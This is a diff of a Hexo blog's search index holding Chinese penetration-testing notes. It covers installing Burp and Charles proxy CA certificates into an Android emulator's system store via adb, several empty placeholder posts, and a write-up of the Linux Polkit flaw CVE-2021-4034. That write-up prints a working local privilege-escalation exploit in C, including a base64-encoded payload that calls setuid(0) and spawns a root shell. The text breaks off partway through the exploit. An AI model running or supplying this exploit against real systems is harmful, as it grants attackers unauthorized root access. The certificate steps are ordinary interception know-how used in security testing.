@@ -4,13 +4,438 @@
   
   
   <entry>
-    <title>Hello World</title>
-    <link href="/2024/02/05/hello-world/"/>
-    <url>/2024/02/05/hello-world/</url>
+    <title>App安装系统证书</title>
+    <link href="/2024/02/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/app/adb%E5%AE%89%E8%A3%85/%E8%AF%81%E4%B9%A6%E5%AE%89%E8%A3%85/"/>
+    <url>/2024/02/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/app/adb%E5%AE%89%E8%A3%85/%E8%AF%81%E4%B9%A6%E5%AE%89%E8%A3%85/</url>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    <content type="html"><![CDATA[<h1>1.burp</h1><h2 id="1-1-导出证书">1.1 导出证书</h2><blockquote><p>顺序proxy -&gt;Options -&gt; Proxy Listeners -&gt; Import/export CA certificate -&gt; Certificate in DER Format -&gt; Next</p></blockquote><p><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/33f15fc0-42ce-5545-a2da-59da4da06e64.png" alt="image-20240204170751889"></p><h2 id="1-2-生成系统证书">1.2 生成系统证书</h2><h3 id="1-2-1-der格式转化成pem">1.2.1 der格式转化成pem</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -inform DER -<span class="hljs-keyword">in</span> 1.der -out burp.pem<br></code></pre></td></tr></table></figure><h3 id="1-2-2-获取有效的系统证书">1.2.2  获取有效的系统证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -inform PEM -subject_hash_old -<span class="hljs-keyword">in</span> burp.pem<br>9a5ba575<br>-----BEGIN CERTIFICATE-----<br>MIIDpzCCAo+gAwIBAgIETg77/TANBgkqhkiG9w0BAQsFADCBijEUMBIGA1UEBhML<br>UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0<br>U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2ln<br>Z2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNDEwMDYwMzAyMzla<br>Fw0zMzEwMDYwMzAyMzlaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UE<br>CBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQ<br>b3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBv<br>cnRTd2lnZ2VyIENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA455X<br>r3d/ai0xtv90GTpWZ7t0YaC5mWpKNMe4vjn5aq7uUjVMa0ICCQXlmAG1+Ck+o2Gb<br>kZE+IO5EWS5b5gP+mD2QFVjPLonBBVioBW0FhhmBzVvs+ddVENPv2dGicHUY1DGG<br>jnN1E0f48Vq5PeLjNrEkMIjl9Ds5WiK7HmcHOs+WKWf6dyKcrBGCFe3+lY2xMrnF<br>0L4owurOLkdiArPf9zz1hEc1xeVB414700/f5m9X1Yk3xuS2kdm/KJpMI4BkuS4d<br>7PffwVAG7qyQXHzIL8YlJoFPcXVlEYWNrLsZFZTPKlyGalnCGAwOYyVrZJ7ouzz9<br>hsg1K7LT2JiktQ68gwIDAQABoxMwETAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3<br>DQEBCwUAA4IBAQCBtxJ4DmDHxmHQS6mdbxKz+jO2r7ZEe2XwyD6atXFpYXFSoFcE<br>Z4A2lMzzZhbwZxqiv6CABkn5yGQU2YRAhlQ/lvyBoEdFh6yVfWjHJA/iHH0o6ASe<br>006d9X3zVC07CwjBVehfoq+GR/R8Fam2zTAywrqW2DKGPl+ywaPjwH8frt3ehQSH<br>bIhtNiaip1GQBjALz7kwwvUD/Alk6MRSzy0OJbQS1/Eu2S/lY177iwcrffPSvA3N<br>6srZlDGalbI1rQyx7AmloVpbkYLS02AN14vR+oH8qU1OLkZA5BLiERKjg3Ct/osP<br>Xorc7zMEt513qWnouYYu4eTjJovuSUnent4k<br>-----END CERTIFICATE-----<br></code></pre></td></tr></table></figure><p><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/84405fca-9a06-5940-98d8-2b370cec6e0d.png" alt="image-20240204171337363"></p><h3 id="1-2-3-创建文件系统证书">1.2.3 创建文件系统证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 9a5ba575.0 <br>vim 9a5ba575.0 <span class="hljs-comment"># 将上面的生成的证书内容写入进去</span><br></code></pre></td></tr></table></figure><p><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/5992b519-7e10-5814-b3a4-78e29f8a8000.png" alt="image-20240204171408080"></p><h2 id="1-3-上传证书">1.3 上传证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb devices<br>adb connect 127.0.0.1:62001<br>adb push 9a5ba575.0 /system/etc/security/cacerts<br>adb shell<br><span class="hljs-built_in">chmod</span> 644 /system/etc/security/cacerts/9a5ba575.0<br></code></pre></td></tr></table></figure><h2 id="1-4-查看证书">1.4 查看证书</h2><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/8e7da066-7ef6-5d7f-b657-c752a7894f3b.png" alt="image-20240204171447821" style="zoom:50%;" /><h1>2.Charles</h1><h2 id="2-1-导出证书">2.1 导出证书</h2><blockquote><p>导出的证书是pem，就不用从der转化成pem了</p></blockquote><p><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/a645ef62-d742-58c3-aa86-7bec43c33f60.png" alt="image-20240204171539900"></p><h2 id="2-2-生成系统证书">2.2 生成系统证书</h2><h3 id="2-2-1-获取有效的系统证书">2.2.1 获取有效的系统证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -inform PEM -subject_hash_old -<span class="hljs-keyword">in</span> charles.pem<br>497926ea<br>-----BEGIN CERTIFICATE-----<br>MIIFZjCCBE6gAwIBAgIGAYvSBr5pMA0GCSqGSIb3DQEBCwUAMIG3MUgwRgYDVQQD<br>DD9DaGFybGVzIFByb3h5IENBICgxNSBOb3YgMjAyMywga2FtYWl0YWNoaW5nZGVN<br>YWNCb29rLVByby5sb2NhbCkxJTAjBgNVBAsMHGh0dHBzOi8vY2hhcmxlc3Byb3h5<br>LmNvbS9zc2wxETAPBgNVBAoMCFhLNzIgTHRkMREwDwYDVQQHDAhBdWNrbGFuZDER<br>MA8GA1UECAwIQXVja2xhbmQxCzAJBgNVBAYTAk5aMB4XDTIzMTExNDA4MDg1OVoX<br>DTI0MTExMzA4MDg1OVowgbcxSDBGBgNVBAMMP0NoYXJsZXMgUHJveHkgQ0EgKDE1<br>IE5vdiAyMDIzLCBrYW1haXRhY2hpbmdkZU1hY0Jvb2stUHJvLmxvY2FsKTElMCMG<br>A1UECwwcaHR0cHM6Ly9jaGFybGVzcHJveHkuY29tL3NzbDERMA8GA1UECgwIWEs3<br>MiBMdGQxETAPBgNVBAcMCEF1Y2tsYW5kMREwDwYDVQQIDAhBdWNrbGFuZDELMAkG<br>A1UEBhMCTlowggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCSoIQHoOUS<br>o6MaEfO7ox7cz0VgfHIJzS7su0gNC1CdIyCkMj5/nxyay+YfMz5YMTk0RZaYpMNG<br>uOGqiTo+ehY/sLspVe5u8KRcLOGvmLTvRQO1CU4eVKkexqiUEZFadR+NYlFyiAEM<br>PDO1s9xJ8qwNGd88DFddCPtg25LUO1lcBwsU3AjyCo2KR6iIoqeD5t5OweanRMiU<br>gdQIcxzJkNuF68Do4dIgDevW389vCyD7c9V46HtMCICQ2cWnA1RBJnPh+sNZSYB8<br>jhxUa4kJfnly3jo+59yjgR6pXZu+EK/r6HAtIx/6ppkLqQRICSuNBnDFlLAfdWtn<br>STK/A9zn1+3BAgMBAAGjggF0MIIBcDAPBgNVHRMBAf8EBTADAQH/MIIBLAYJYIZI<br>AYb4QgENBIIBHROCARlUaGlzIFJvb3QgY2VydGlmaWNhdGUgd2FzIGdlbmVyYXRl<br>ZCBieSBDaGFybGVzIFByb3h5IGZvciBTU0wgUHJveHlpbmcuIElmIHRoaXMgY2Vy<br>dGlmaWNhdGUgaXMgcGFydCBvZiBhIGNlcnRpZmljYXRlIGNoYWluLCB0aGlzIG1l<br>YW5zIHRoYXQgeW91J3JlIGJyb3dzaW5nIHRocm91Z2ggQ2hhcmxlcyBQcm94eSB3<br>aXRoIFNTTCBQcm94eWluZyBlbmFibGVkIGZvciB0aGlzIHdlYnNpdGUuIFBsZWFz<br>ZSBzZWUgaHR0cDovL2NoYXJsZXNwcm94eS5jb20vc3NsIGZvciBtb3JlIGluZm9y<br>bWF0aW9uLjAOBgNVHQ8BAf8EBAMCAgQwHQYDVR0OBBYEFBDgyyAvidmOnixhCiCq<br>TTY5YOiiMA0GCSqGSIb3DQEBCwUAA4IBAQAvGXDQ14gMzUM1/BdeHDLXRDdZ5kDr<br>JM839gtCJOVreDqz9xIWNaNmPdsi2soF3Qq5zeRr/wp62RiBXLR+bhBWxhVSA7ym<br>V90GMI8u9K6ABuSnY+KlqAWwj/kn1C1FtLi+bAicMX2J8dM2ivIOzVkfLd1NdB0+<br>7cqK0VSWsGmFaBmBU2uuaDMAjUrawJhOup0X9lmNz1BufgKI/5PrlZg3ny6Tb40V<br>p5iOwKuTJg7hWM+/pVnTYSYXmTjIOYVbZYy+e8GEFKHFkN+A8ObtXqvf9t5DY2YA<br>s+/LwLgytX06bxpGkYyX3DttfoHExXfXYsevBSNhZk9gOWOPi+jY0Zdg<br>-----END CERTIFICATE-----<br></code></pre></td></tr></table></figure><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/b3a1f3b7-c813-555f-887a-d115d7b4b6ad.png" alt="image-20240204171623408" style="zoom:50%;" /><h3 id="2-2-2-创建文件系统证书">2.2.2 创建文件系统证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 497926ea.0 <br>vim 497926ea.0 <br><span class="hljs-built_in">cat</span> 497926ea.0 <br></code></pre></td></tr></table></figure><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/704533fd-0932-5dcf-bcba-addc8154bcf2.png" alt="image-20240204171708008" style="zoom:50%;" /><h2 id="2-3-上传证书">2.3 上传证书</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb devices<br>adb connect 127.0.0.1:62001<br>adb push 9a5ba575.0 /system/etc/security/cacerts<br>adb shell<br><span class="hljs-built_in">chmod</span> 644 /system/etc/security/cacerts/9a5ba575.0<br></code></pre></td></tr></table></figure><h2 id="2-4-查看证书">2.4 查看证书</h2><img src="https://k-blogs.oss-cn-beijing.aliyuncs.com/blog/f0cb3350-71f9-5c83-8f5f-5082af29ac8a.png" alt="image-20240204171750497" style="zoom:50%;" />]]></content>
     
     
+    <categories>
+      
+      <category>渗透测试</category>
+      
+      <category>环境安装</category>
+      
+      <category>APP</category>
+      
+      <category>adb安装</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>环境安装</tag>
+      
+      <tag>ADB</tag>
+      
+      <tag>抓包证书</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E7%BC%96%E7%A8%8B/C#/index/"/>
+    <url>/2024/01/26/%E7%BC%96%E7%A8%8B/C#/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+      <category>C#</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>代码编写</tag>
+      
+      <tag>C#</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E7%BC%96%E7%A8%8B/PHP/index/"/>
+    <url>/2024/01/26/%E7%BC%96%E7%A8%8B/PHP/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+      <category>PHP</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>代码编写</tag>
+      
+      <tag>PHP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E7%BC%96%E7%A8%8B/Python/index/"/>
+    <url>/2024/01/26/%E7%BC%96%E7%A8%8B/Python/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+      <category>Python</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>代码编写</tag>
+      
+      <tag>Python</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E7%BC%96%E7%A8%8B/Java/index/"/>
+    <url>/2024/01/26/%E7%BC%96%E7%A8%8B/Java/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>编程</category>
+      
+      <category>JAVA</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>代码编写</tag>
+      
+      <tag>java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/index/"/>
+    <url>/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+      <category>环境安装</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>环境安装</tag>
+      
+      <tag>未知(python/docker/java/C#/php等)</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B0%8F%E7%A8%8B%E5%BA%8F/index/"/>
+    <url>/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B0%8F%E7%A8%8B%E5%BA%8F/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+      <category>小程序</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>小程序</tag>
+      
+      <tag>未知(框架/组件/windows/linux/app)</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%A7%BB%E5%8A%A8%E6%B5%8B%E8%AF%95/index/"/>
+    <url>/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%A7%BB%E5%8A%A8%E6%B5%8B%E8%AF%95/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+      <category>移动测试</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>未知(框架/组件/windows/linux/app)</tag>
+      
+      <tag>移动测试</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/index/"/>
+    <url>/2024/01/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>渗透测试</category>
+      
+      <category>WEB</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>渗透测试</tag>
+      
+      <tag>未知(框架/组件/windows/linux/app)</tag>
+      
+      <tag>WEB</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/CVE/%E7%BB%84%E4%BB%B6/index/"/>
+    <url>/2024/01/26/CVE/%E7%BB%84%E4%BB%B6/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>CVE</category>
+      
+      <category>组件</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE</tag>
+      
+      <tag>漏洞</tag>
+      
+      <tag>组件</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/CVE/%E6%A1%86%E6%9E%B6/index/"/>
+    <url>/2024/01/26/CVE/%E6%A1%86%E6%9E%B6/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>CVE</category>
+      
+      <category>框架</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE</tag>
+      
+      <tag>漏洞</tag>
+      
+      <tag>框架</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>测试</title>
+    <link href="/2024/01/26/CVE/Windows/index/"/>
+    <url>/2024/01/26/CVE/Windows/index/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>CVE</category>
+      
+      <category>Windows</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE</tag>
+      
+      <tag>漏洞</tag>
+      
+      <tag>Windows</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CVE-2021-4034</title>
+    <link href="/2024/01/25/CVE/Linux/CVE-2021-4034/"/>
+    <url>/2024/01/25/CVE/Linux/CVE-2021-4034/</url>
+    
+    <content type="html"><![CDATA[<h1>1. 漏洞名称</h1><blockquote><p>Linux Polkit 权限提升</p></blockquote><h1>2. 漏洞简述</h1><blockquote><p>polkit是一个授权管理器，其系统架构由授权和身份验证代理组成，pkexec是其中polkit的其中一个工具，他的作用有点类似于sudo，允许用户以另一个用户身份执行命令</p><p>polkit 提供了一个授权 API，供特权程序（“ MECHANISMS ” ）使用，通常通过某种形式的进程间通信机制为非特权程序（ “ SUBJECTS ”）提供服务。在这种情况下，该机制通常将主体视为不受信任。对于来自主体的每个请求，该机制需要确定该请求是否被授权，或者它是否应该拒绝为主体提供服务。使用 polkit API，一种机制可以将此决定转交给受信任的一方：polkit 权威。</p><p>polkit 权限被实现为系统守护进程polkitd (8)，它本身没有什么特权，因为它以 <em>polkitd</em>系统用户身份运行。机制、主体和认证代理使用系统消息总线与授权机构进行通信。</p><p>除了作为授权之外，polkit 还允许用户通过验证管理用户或客户端所属会话的所有者来获得临时授权。这对于机制需要验证系统的操作员确实是用户还是管理用户的场景很有用</p></blockquote><h1>3. 影响版本</h1><h2 id="3-1-受影响版本">3.1 受影响版本</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">·</span> <span class="hljs-number">2009</span><span class="hljs-string">年5月至今发布的所有</span> <span class="hljs-string">Polkit</span> <span class="hljs-string">版本</span><br><span class="hljs-string">注：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。</span><br></code></pre></td></tr></table></figure><h2 id="3-2-不受影响版本">3.2 不受影响版本</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs subunit">CentOS：<br>· CentOS 6：polkit<span class="hljs-string">-0</span>.96<span class="hljs-string">-11</span>.el6_10.2<br>· CentOS 7：polkit<span class="hljs-string">-0</span>.112<span class="hljs-string">-26</span>.el7_9.1<br>· CentOS 8.0：polkit<span class="hljs-string">-0</span>.115<span class="hljs-string">-13</span>.el8_5.1<br>· CentOS 8.2：polkit<span class="hljs-string">-0</span>.115<span class="hljs-string">-11</span>.el8_2.2<br>· CentOS 8.4：polkit<span class="hljs-string">-0</span>.115<span class="hljs-string">-11</span>.el8_4.2<br>Ubuntu：<br>· Ubuntu 14.04 ESM：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-4</span>ubuntu3.14.04.6+esm1<br>· Ubuntu 16.04 ESM：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-14</span>.1ubuntu0.5+esm1<br>· Ubuntu 18.04 LTS：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-20</span>ubuntu0.18.04.6<br>· Ubuntu 20.04 LTS：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-26</span>ubuntu1.2<br>· Ubuntu 21.10：policykit<span class="hljs-string">-1</span><span class="hljs-string">-0</span>.105<span class="hljs-string">-31</span>ubuntu0.1<br>Debain：<br>· policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-18</span>+deb9u2<br>· Debain stretch：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-18</span>+deb9u2<br>· Debain buster：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-25</span>+deb10u1<br>· Debain bullseye：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-31</span>+deb11u1<br>· Debain bookworm,bullseye：policykit<span class="hljs-string">-1</span> 0.105<span class="hljs-string">-31</span>.1<br></code></pre></td></tr></table></figure><h1>4. 利用</h1><h2 id="4-1-利用脚本">4.1 利用脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @author: luijait</span><br><span class="hljs-comment"> * @version: 1.0</span><br><span class="hljs-comment"> * @CVE: CVE-2021-4034 </span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">enviroment</span><span class="hljs-params">()</span><br>&#123;<br>system(<span class="hljs-string">&quot;mkdir &#x27;GCONV_PATH=.&#x27; &amp;&amp; touch &#x27;GCONV_PATH=./tmp&#x27; &amp;&amp; chmod +x &#x27;GCONV_PATH=./tmp&#x27;&quot;</span>);<br>system(<span class="hljs-string">&quot;mkdir tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBnY29udih2b2lkKSB7fQoKCnZvaWQgZ2NvbnZfaW5pdCh2b2lkICpzdGVwKQp7CgkvL1Blcm1zIAoJc2V0dWlkKDApOyBzZXRldWlkKDApOyBzZXRnaWQoMCk7IHNldGVnaWQoMCk7CQoJLy9JbnZvcXVlIFNoZWxsCgljaGFyICogc2hlbGxbXSA9IHsgIi9iaW4vYmFzaCIsICItaSIsIE5VTEwgfTsKCS8vRGVmaW5lIFBhdGgKCWNoYXIgKiBlbnZfdmFyc1tdID0geyAiUEFUSD0vdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iLCBOVUxMIH07CglleGVjdmUoc2hlbGxbMF0sIHNoZWxsLCBlbnZfdmFycyk7CglleGl0KDApOyAKfQo= | base64 -d &gt; tmp/b64load.c; gcc tmp/b64load.c -o tmp/pwnkit.so -shared -fPIC &quot;</span>);<br>system(<span class="hljs-string">&quot;echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d &gt; tmp/gconv-modules&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">banner</span><span class="hljs-params">()</span><br>&#123;<br>setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current User before execute exploit\nhacker@victim$whoami: &quot;</span>);<br>system(<span class="hljs-string">&quot;whoami&quot;</span>);<br>sleep(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Exploit written by 